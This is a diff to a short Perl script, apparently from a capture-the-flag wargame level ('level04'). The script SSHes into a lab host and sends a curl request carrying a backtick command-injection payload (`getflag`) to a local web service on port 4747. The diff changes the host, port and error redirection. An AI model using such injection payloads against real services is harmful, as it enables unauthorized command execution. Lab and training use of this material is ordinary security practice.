@@ -1,12 +1,12 @@
 #!/usr/bin/perl
 
-$ip = @ARGV ? $ARGV[0] : "192.168.56.2";
-$user = "level04";
-
+$port = "22222";
+$ip = "localhost";
 $red = "\e[31m";
 $green = "\e[32m";
 $reset = "\e[0m";
+$user = "level04";
 
-$inject = "curl localhost:4747/?x=\\`getflag\\`";
+$inject = "curl localhost:4747/?x=\\`getflag\\` 2>/dev/null";
 print $red, $inject, $reset, "\n";
-system("ssh -qp 4242 $user\@$ip '$inject'");
+system("ssh -qp $port $user\@$ip '$inject'");
